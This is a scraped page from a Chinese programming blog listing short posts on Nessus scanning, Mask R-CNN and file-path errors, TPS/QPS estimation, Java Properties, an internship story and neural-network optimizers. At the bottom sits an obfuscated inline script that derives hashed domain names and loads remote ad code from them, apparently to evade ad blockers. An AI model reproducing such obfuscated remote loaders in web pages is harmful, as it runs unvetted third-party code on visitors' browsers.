			<a href="/posts/18eee38ea3484cf66399e41b11cf45e5/" rel="bookmark">
			渗透测试5.2简单使用Nessus扫描目标主机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 单击Scans-&gt;New Scan
若出现下面的现象，多刷新几次就好
2. 启动扫描任务后，Nessus就会针对目标主机进行一系列检测，全面揭示目标系统的安全问题
3. 待Nessus完成扫描任务后，单击扫描结果
4. 导出扫描结果
扫描完成后，可以把扫描报告存储为常见的文件格式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07db3256b90e554502e5f5aff1caa8ab/" rel="bookmark">
			解决Mask RCNN的pytorch版本训练时候RuntimeError: Error(s) in loading state_dict for GeneralizedRCNN:
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决训练时候的RuntimeError: Error(s) in loading state_dict for GeneralizedRCNN: - 此处错误是在Linux环境下maskrcnn的pytorch版本中遇到的
在训练完成mask rcnn模型后进行图像识别时候出现错误为
Traceback (most recent call last): File "/home/wangfan/maskrcnn-benchmark/demo/person.py", line 74, in &lt;module&gt; confidence_threshold=0.7, File "/home/wangfan/maskrcnn-benchmark/demo/fcpredictorbox.py", line 73, in __init__ _ = checkpointer.load(cfg.MODEL.WEIGHT) File "/home/wangfan/maskrcnn-benchmark/maskrcnn_benchmark/utils/checkpoint.py", line 62, in load self._load_model(checkpoint) File "/home/wangfan/maskrcnn-benchmark/maskrcnn_benchmark/utils/checkpoint.py", line 98, in _load_model load_state_dict(self.model, checkpoint.pop("model")) File "/home/wangfan/maskrcnn-benchmark/maskrcnn_benchmark/utils/model_serialization.py", line 80, in load_state_dict model.load_state_dict(model_state_dict) File "/home/wangfan/anaconda3/envs/maskrcnn/lib/python3.7/site-packages/torch/nn/modules/module.py", line 830, in load_state_dict self.__class__.__name__, "\n\t".join(error_msgs))) RuntimeError: Error(s) in loading state_dict for GeneralizedRCNN: size mismatch for roi_heads.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07db3256b90e554502e5f5aff1caa8ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a507a240fad87b6ab691320cc741c44/" rel="bookmark">
			TPS&amp;QPS的估算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 PV（Page View）：页面访问量，每次用户访问或者刷新页面都会被计算在内。
QPS（Query Per Second）：每秒查询数，每秒系统能够处理的查询请求次数。
TPS（Transactions Per Second）：每秒事务数，每秒系统能够处理的事务次数。
TPS与QPS是有区别的 事务表示客户端发起请求到收到服务端最终响应的整个过程，这是一个TPS
而在这个TPS中，为了处理第一次请求可能会引发后续多次对服务端的访问才能完成这次工作，每次访问都算一个QPS。
所以，一个TPS可能包含多个QPS
计算 日PV=QPS*60*60*24 //即QPS乘以一天的秒数
峰值QPS=(日PV*80%)/(60*60*24*20%）//通用公式每天80%的访问集中在20%的时间里，这20%时间叫做峰值时间
--------------------------------------------------------------------------------------------------------------------------------------------------------
概念 QPS：Queries Per Second意思是“每秒查询率”，是一台服务器每秒能够相应的查询次数，是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。
TPS：是TransactionsPerSecond的缩写，也就是事务数/秒。它是软件测试结果的测量单位。一个事务是指一个客户机向服务器发送请求然后服务器做出反应的过程。客户机在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数，
计算方法 原理：每天80%的访问集中在20%的时间里，这20%时间叫做峰值时间。
公式：( 总PV数 * 80% ) / ( 每天秒数 * 20% ) = 峰值时间每秒请求数(QPS) 。
机器：峰值时间每秒QPS / 单台机器的QPS = 需要的机器 。
每天300w PV 的在单台机器上，这台机器需要多少QPS？
( 3000000 * 0.8 ) / (86400 * 0.2 ) = 139 (QPS)。
一般需要达到139QPS，因为是峰值。
QPS
每秒查询率QPS是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。
每秒查询率
因特网上，经常用每秒查询率来衡量域名系统服务器的机器的性能，其即为QPS。
对应fetches/sec，即每秒的响应请求数，也即是最大吞吐能力。
--------------------------------------------------------------------------------------------------------------------------------------------------------
TPS TPS：Transactions Per Second，意思是每秒事务数，一个事务是指一个客户机向服务器发送请求然后服务器做出反应的过程。客户机在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a507a240fad87b6ab691320cc741c44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/184d85764f08f121b6c1008f7e7f6dcf/" rel="bookmark">
			解决FileNotFoundError: [Errno 2] No such file or directory: &#39;xxx.jpg&#39;错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在linux下进行two stage 网络训练时候, FileNotFoundError: [Errno 2] No such file or directory: 'xxx.jpg’错误时候 声明:此博客仅用于记录日常错误
2020年5月8日下午16:01, 在训练Mask Scoring RNN时, 运行train.sh进行人体课堂状态训练时候,报错:
FileNotFoundError: [Errno 2] No such file or directory: 'datasets/coco/train2017/..\\image\\16.jpg' 如下图所示
放大
其中报错:
在No such file or directory: 'datasets/coco/train2017/..\\image\\16.jpg' 仔细检查文件位置发现
图片位置和标签位均无误
发现是之前用labelme对图像进行打标签时候,把标签(即.json文件和图像放在两个文件夹中导致路径错误)暂时找不到什么解决办法只能重新打标签,将标签和图像放在同一文件夹中
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87474e04ad9637125d4bbbf99cc23ba3/" rel="bookmark">
			javaSE---Properties类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Properties类 1. Properties:持久的属性集合类,没有泛型 属性列表中每个键及其对应值都是一个字符串。 extends Hashtable&lt;K,V&gt;	put(key,value):添加键值对数据 特有功能: public Object setProperty(String key,String value) 给属性列表中添加属性以及对应 value值 获取功能: public String getProperty(String key):通过属性列表中的键获取对应的内容 获取属性列表中的所有的键的集合 public Set&lt;String&gt; stringPropertyNames()返回此属性列表中的键集，其中该键及其对应值是字符串 属性集合类和流有关系: void load(InputStream inStream) void load(Reader reader) 将文本文件中的数据读取到属性列表中 前提(文件的内容必须是键值对存在) void store(OutputStream out, String comments) void store(Writer writer, String comments) 参数 comments:对属性列表的描述 将属性列表中的键值对元素输出到指定文本文件中 2.代码示例 /** * @Author xiaoqi * @Date * 持久的属性集合类 */ public class PropertiesTest { /** *1. Properties类中的常用的Api */ @Test public void APITest01(){ Properties pro = new Properties(); // 添加数据 pro.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87474e04ad9637125d4bbbf99cc23ba3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c492b9b2e1006f772557f467d656421a/" rel="bookmark">
			杭州亚信实习offer获取经历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 2017步入大学的校门，2020年的我们，马上要结束大三的学习生涯，迎来大学的最后一年。
大三其实也是一条分水岭，人各有志，每个人都有自己的考虑，所以在这条分水岭不同的人选择了不同的道路，有的想考研，有的想就业，有的想考公务员…而我也选择了一年之后步入就业的大军，和千千万万的求职者一样，选择了千百人过独木桥的就业生活。
现在的就业压力，相信了解互联网，了解IT行业的人都知道，不论是2019的互联网寒冬还是2020年的疫情的影响，这个行业也是越来越难。
因此，尽早的熟悉行业，尽早的进入就业状态，可能在你未来的就业历程中让你更加的如鱼得水。我也和很多人一样，在大三的寒假就开始寻找实习，毕竟对于这个行业，一次正规的实习经历将是就业不错的一块敲门砖。
为此在假期我也投递了很多的简历，虽然绝大多数都是石沉大海，但是总得付出行动才可能会有结果。
亚信经历 1.简历投递 其实亚信和我投递的其他的众多的公司一样，我都不是很熟悉，毕竟在这个年纪，没有经历过行业的磨砺，大部分时间都是在校，所以对于一些公司都不是很熟悉的。在投递了亚信之后没过多久就有人联系了我，之所以写一篇这个公司有关的博客，更多的是因为在招聘系统中对方和我的聊天让我觉得挺不错，后来也拿到了他们的实习offer。
2.顺利面试 在和招聘人员沟通过后没多久，负责面试的公司人员就给我打电话确定了面试的时间。到了时间也进行了如期的面试。面试官问的问题比较多，但是还算是比较基础吧，从数据结构和算法、计算机网络、数据库、java基础、jvm以及GC、还有中间件、项目经历、项目技术以及解决的问题等的都有涉及吧。个人觉得自己的回答还算是满意吧。但是因为之前的很多面试之后就没有了下文，所以对于亚信的面试也是没有抱有太大的希望。
3.招聘人员的联系 面试过了大概三四天，惊奇过得收到了公司的邮件。
后来就是一系列问题的确认以及沟通。因为受到疫情的影响，我们学校还未开学，因此联系的是在七月底暑假放假之后进行入职实习。
入职流程 可能很多大三大四的同学在寻找实习的时候，对于入职的流程还不是很熟悉，这次我就借着亚信的流程为大家做一下解释，当然不同的公司的入职流程还是不一样的。
入职信息确认—公司招聘人员联系面试通过的同学 发放聘用意向书，背景调查授权
发放聘用意向书中会给你指明公司安排的实习岗位，实习薪资、办公地点以及电脑是够自带等等问题。你需要在看完之后回复给公司是否接受聘用意向。 如果你接受了聘用意向，那就需要为背景调查授权
可能很多刚找实习的同学对于这个环节不是很了解，其实这个环节在大厂或者说是正规公司是很常见的。简单的说就是对你的简历、个人信息、在校/社会情况等做调查，看是否和你描述以及简历上的一致，是否存在其他因素等的评判。
登录新员工入职系统，在线提交材料，同时补充信息 这个环节就是确认各种信息，系统提示你入职时间以及入职需要的各种材料。同时预约号入职的时间，在预约当天到公司指定人员处报到。
按时到公司报到，完成入职 这大概就是一个公司的入职过程吧，可能有的公司比这个更加繁琐。亚信的入职流程也仅仅为寻找实习工作的你们提供一个参考。
希望大家都能找到合适自己的岗位！
我是九岁ya，一个孤独的程序猿
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/caa6f96a7cabb7744df43c656b8407f8/" rel="bookmark">
			关于神经网络的优化算法说明，以及LM算法的简单介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.神经网络的优化算法有很多，分为一阶优化算法和二阶优化算法。2.一阶就是我们平时常用的梯度法。例如神经网络里面自带的SGD,Adam等等。3.原始的 BP 算法是基于梯度下降法，训练过程是通过调整权值和阀值，使输出期望值和神经网络实际输出值的均方误差梯度趋于最小而实现的。这种基于梯度下降方法是一阶收敛，不仅收敛速度很慢，而且如初始值选取不适当，优化将陷入局部最小或最大值。4.二阶优化算法就是采用二阶导数进行优化算法。二阶导数，有时候也被成为海森矩阵（Hessian），但是计算量很大。LM算法就是一种二阶优化算法。LM 算法是 Gauss-Newton 法的改进形式，既有 Gauss-Newton 法的局部特性，又具有梯度法的全 局特性 参考：
https://blog.csdn.net/autocyz/article/details/83114245?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1http://xueshu.baidu.com/usercenter/paper/show?paperid=c312121e2030f20d101e160da1e48d27&amp;site=xueshu_se 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/435/">«</a>
	<span class="pagination__item pagination__item--current">436/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/437/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>